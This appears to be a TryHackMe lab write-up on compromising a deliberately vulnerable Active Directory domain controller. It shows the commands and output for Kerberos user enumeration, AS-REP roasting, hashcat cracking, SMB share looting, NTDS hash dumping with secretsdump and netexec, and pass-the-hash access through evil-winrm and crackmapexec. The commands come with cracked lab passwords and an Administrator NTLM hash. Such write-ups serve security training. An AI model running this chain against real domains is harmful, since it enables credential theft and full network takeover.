99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?

## Enumeration
Starting off with an nmap scan on the target (I have already exported the IP address of the target to the variable $target)

```
nmap -p- -sV -sC $target --open
```

![image](https://github.com/user-attachments/assets/e9619ed8-21bf-44c8-8d42-6cb0b2a8668c)


So we can see the Active Directory domain: spookysec.local

We can see that this is an AD with typical AD related services running such as Kerberos, SMB, RPC and LDAP. I will enumerate these services one-by-one to see if we can get a foothold.

### SMB
Nmap revealed SMB ports open on 149, 445. So let’s enumerate SMB further. We can use:

- enum4linux
- Nmap scripts specifically for SMB enumeration.
- crackmapexec

I am running these scans concurrently.

```
enum4linux -smb $target

nmap -p139,445 --script=smb-enum-shares -sC $target

crackmapexec smb $target
```

The SMB nmap script does not reveal anything that we have not already seen from the original nmap scan.

![image](https://github.com/user-attachments/assets/cbc21a13-7fff-4ded-b192-f2ade561531b)


Why is port 445 open? Basic domain functions usually require Port 445 to be open. These functions include remote file access, software deployment, and system management.

#### crackmapexec
crackmapexec reveals some results about the target. This tool can also be used for brute-forcing (if we find some credentials)

![image](https://github.com/user-attachments/assets/168ca8ea-5789-4377-9a34-004aecd1c467)

Key info:

- Hostname: ATTACKTIVEDIREC
- Domain: spookysec.local
- OS: Windows 10 / Server 2019 Build 17763

#### enum4linux
The enum4linux scan gave us a Domain SID and the Netbios Domain Name of the machine:

![image](https://github.com/user-attachments/assets/d1a026a8-db8b-4d70-8d3b-3446db4ce56d)


SID: Security Identifiers. These identifiers ensure domains are distinguishable.

## Kerberos
This TryHackMe box comes with a user and password list for brute-forcing. Kerbrute is a tool used to enumerate valid user names (find out what usernames are legitimate and exist on the target system).

This is the best guide that I’ve found for installing and executing Kerbrute: https://www.hackingarticles.in/a-detailed-guide-on-kerbrute/

```
sudo ./kerbrute_linux_amd64 userenum — dc $target -d spookysec.local userlist.txt
```

The full output below shows a list of legitimate Kerberos user accounts that exist on this domain. That’s great for enumeration because we have more information to help us get a foothold.

Usernames such as svc-admin, administrator, backup are notable findings with potentially elevated privileges.

![image](https://github.com/user-attachments/assets/dab96113-f857-400d-9e97-db8664ba8421)


## ASREPRoasting
ASReproasting occurs when a user account has the privilege “Does not require Pre-Authentication” set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

AS-REP = Authentication Server Reply

Roasting = Slang for extracting a Kerberos-encrypted value (like a hash) that can be cracked offline

We can use impacket to attempt ASREPRoasting to retrieve Kerberos tickets. Starting off with the GetNPUsers.py script.

But what does it mean? It’s important to understand why we are using this script.

GetNPUsers.py = Get No Preauthentication Users

```
python3 examples/GetNPUsers.py spookysec.local/ -no-pass -usersfile /home/kali/Downloads/userlist.txt -dc-ip 10.10.28.119
```

We can see below that I’ve found some information. I now know, that James can’t be AS-REP roasted.

User james doesn’t have UF_DONT_REQUIRE_PREAUTH set

![image](https://github.com/user-attachments/assets/d5506507-2e68-4465-aaba-5d54243cb023)


A few minutes later I’ve found something.

```
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:[long hash]
```

![image](https://github.com/user-attachments/assets/10e25d2d-f292-4902-b327-53d36225de9e)


We can query a kerberos ticket from the user: svc-admin without a password. In other words, we can AS-REP roast this user.

We can also do a lookup for this hash type on Hashcat’s Wikipedia page.

- Hash type: Kerberos 5, etype 23, AS-REP
- Hash-mode: 18200

We can use hashcat to crack the hash. Hashes cannot be reversed unlike encryption/decryption. Hashes are rather compared against a database of known hashes and this how they are ‘cracked’.

Hashcat scan:

![image](https://github.com/user-attachments/assets/a05beef0-c7f8-4ad6-ab25-1f0f12cdd850)


```
hashcat -m 18200 hash.txt wordlist.txt
```

Here’s the results of the scan, where the hash has been cracked successfully: `management2005`

**Username:** svc-admin  
**Password:** management2005

![image](https://github.com/user-attachments/assets/d829a0fe-1c4f-4323-b76c-d222e530c645)


---

## SMBCLIENT
Administrative shares like C$, ADMIN$, and IPC$ are always visible to authenticated users on Windows systems by design. However, visibility doesn't necessarily mean access is possible.

We can use these credentials to dig for further information. For example, we know that the target has SMB services running on Port 139 and 445. There is a high possibility of SMB shares being shared publicly.

### Enumerate SMB shares:

```
smbclient -L \\$target -U 'svc-admin'
# or without prompt:
smbclient -L \\$target -U svc-admin%management2005
```

![image](https://github.com/user-attachments/assets/0184b9f4-fc4b-47b9-96db-2fba8e91d529)


### Connect to a share:

![image](https://github.com/user-attachments/assets/f0a6b56a-9233-42fc-9ef3-ce4b530b3430)


```
smbclient \\$target\backup -U svc-admin%management2005
```

GUI Method (Kali):
- Open Files
- Type: `smb://$target/backup`
- Enter username: `svc-admin`, password: `management2005`

![image](https://github.com/user-attachments/assets/1e1d96b9-c37d-47d6-9185-69ca7e23d4c8)


Use `dir`, `ls`, `get` to interact.

![image](https://github.com/user-attachments/assets/d98b96dd-cbff-41fa-9d1c-587958211b70)


### Example:
`backup_credentials.txt` file contains a base64 encoded string:

![image](https://github.com/user-attachments/assets/bcdac88f-50fd-40ca-a074-0a68fd6b0735)



```bash
base64 -d backup_credentials.txt
```

![image](https://github.com/user-attachments/assets/04a77714-9614-4ac9-b8e3-54b8af8e9409)

---

## Pass the Hash

Use impacket’s `secretsdump.py` with the backup account:

```bash
python3 examples/secretsdump.py spookysec.local/backup:backup2517860@$target
```

This reveals NTLM hashes including Administrator:

**Administrator hash:**  
`0e0363213e37b94221497260b0bcb4fc`

![image](https://github.com/user-attachments/assets/3ed04c79-ff1e-4188-820d-e0056e9b7366)


---

## Evil WinRM (PTH)

```bash
evil-winrm -H 0e0363213e37b94221497260b0bcb4fc -i 10.10.157.141 -u Administrator
```

![image](https://github.com/user-attachments/assets/8bbf7d77-7084-493d-8174-c4f0322f7579)



Use `cd`, `dir`, `type` to navigate and capture the flag.

---

## Netexec (alt to secretsdump)

```bash
netexec smb 10.10.157.141 -u backup -p backup2517860 --ntds
```

![image](https://github.com/user-attachments/assets/f942293b-83c0-4dd7-895b-feffde670791)

![image](https://github.com/user-attachments/assets/9e805141-202f-4d10-8cdf-e172df78d5a5)


## Crackmapexec for Remote Commands

```bash
crackmapexec smb 10.10.157.141 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc -x "whoami"
crackmapexec smb 10.10.157.141 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc -X "whoami"
```

![image](https://github.com/user-attachments/assets/48232576-a0be-40c5-8fe4-d6d416c72fb2)

![image](https://github.com/user-attachments/assets/e3fa16a0-a759-41a9-996e-8d96b5752d3d)

---

Thanks for reading. If you have questions, let me know. If you want to share something or get in touch, comment below.
